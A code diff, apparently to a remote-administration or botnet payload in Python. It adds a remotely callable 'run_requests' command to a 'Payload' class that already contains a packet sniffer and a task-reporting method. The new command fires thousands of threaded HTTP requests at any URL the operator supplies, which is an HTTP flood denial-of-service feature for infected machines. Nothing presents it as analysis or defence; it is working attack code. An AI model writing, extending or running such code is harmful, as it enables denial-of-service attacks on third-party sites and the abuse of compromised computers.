@@ -20,6 +20,9 @@ import subprocess
 import collections
 import multiprocessing
 import logging.handlers
+import concurrent.futures
+import time
+import requests
 
 if sys.version_info[0] < 3:
     from urllib import urlretrieve
@@ -929,7 +932,45 @@ class Payload():
                     return self.packetsniffer.usage
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='send_http_request(self, url, method="GET", headers=None, body=None, timeout=5)')
+    def send_http_request(self, url, method="GET", headers=None, body=None, timeout=5):
+        response = requests.request(
+            method=method,
+            url=url,
+            headers=headers,
+            data=body,
+            timeout=timeout
+        )
+        return response
+    """
+    send request
+    args: url, num_threads, total_requests
+    """
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='run_requests(self, url, num_threads, total_requests)')
+    def run_requests(self, args):
+        args = str(args).split()
+        url = args[0]
+        num_threads = int(args[1])
+        total_requests = int(args[2])
+        start = time.time()
+        request_count = 0
 
+        def task(_):
+            return self.send_http_request(url)
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+            futures = [executor.submit(task, i) for i in range(total_requests)]
+
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    response = future.result()
+                    request_count += 1
+                    print(f"Status code: {response.status_code} - Response length: {len(response.text)} - Count: {request_count}")  # print result
+                except Exception as e:
+                    print("Request failed:", e)
+
+        print("Done in", time.time() - start, "seconds")    
+        return "Completed {} requests to {}".format(total_requests, url)
     def send_task(self, task):
         """
         Send task results to the server
